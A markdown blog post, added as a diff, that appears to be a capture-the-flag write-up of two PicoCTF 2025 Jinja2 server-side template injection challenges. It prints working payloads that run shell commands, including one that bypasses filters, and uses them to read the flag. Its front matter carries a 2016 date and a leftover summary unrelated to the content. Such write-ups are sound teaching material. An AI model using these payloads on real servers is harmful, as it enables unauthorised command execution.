@@ -1,0 +1,67 @@
+---
+title: PicoCTF2025
+date: '2016-03-08'
+draft: false
+summary: Example of a markdown file with code blocks and syntax highlighting
+---
+
+## SSTI1
+
+From the challenge title, it's clear that we're dealing with **Server-Side Template Injection (SSTI)**. By testing a few payloads, we can identify the template engine being used.
+
+## Identifying the Template Engine
+
+Here are some basic payloads for different template engines:
+
+![template-decision-tree](/static/images/template-decision-tree.png)
+
+After testing these, the one that works is `{{ 7*7 }}`, returning `49`, confirming the engine is **Jinja2**.
+
+## Exploitation
+
+To confirm command execution, I try:
+
+```jinja
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('whoami').read() }}
+```
+
+It works! Then I go ahead and read the flag:
+
+```jinja
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}
+```
+
+And successfully retrieve the flag.
+
+> Helpful source: [SSTI Server Side Template Injection - Medium](https://medium.com/@yadav-ajay/ssti-server-side-template-injection-746dda439038)
+
+---
+
+## SSTI2
+
+In the second challenge, the vulnerability is confirmed using:
+
+```jinja
+{{ 7 * '7' }}
+```
+
+Which returns: `7777777`  
+This again confirms SSTI.
+
+### Bypassing Filters
+
+I found this obfuscated payload that bypasses filters and still achieves code execution:
+
+```jinja
+{{ request | attr('application') | attr('__globals__') | attr('__getitem__')('__builtins__') | attr('__getitem__')('__import__')('os') | attr('popen')('id') | attr('read')() }}
+```
+
+Then I modify it to read the flag:
+
+```jinja
+{{ request | attr('application') | attr('__globals__') | attr('__getitem__')('__builtins__') | attr('__getitem__')('__import__')('os') | attr('popen')('cat flag') | attr('read')() }}
+```
+
+> Reference: [Server Side Template Injection with Jinja2 - OnSecurity](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)
+
+> Reference: [Port Swigger SSTI](https://portswigger.net/web-security/server-side-template-injection)
